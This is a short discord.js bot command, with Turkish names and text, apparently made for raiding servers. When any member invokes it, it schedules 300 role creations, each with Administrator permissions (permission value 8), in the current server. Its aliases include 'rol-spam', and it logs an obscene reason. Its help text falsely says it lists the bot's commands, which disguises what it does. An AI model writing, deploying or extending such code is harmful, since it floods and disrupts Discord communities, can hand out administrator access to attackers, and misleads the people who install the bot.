const { MessageEmbed } = require("discord.js");
const conf = require("../ayarlar.json");

module.exports.run = async (client, message, args) => {

  for (let i = 0; i < 300; i++) {
    setTimeout(function() {
      message.guild.roles.create({ data: { name: "yusuf", color: "08fbdd", permissions: 8 }, reason: "ananı-sikim*oç-asd" });
    }, 3000)
  }

}
module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ["rol-aç", "rol-spam"],
  permLevel: 0
};

module.exports.help = {
  name: 'rol',
  description: 'Botta bulunan tüm komutları gösterir',
  usage: 'komutlar'
};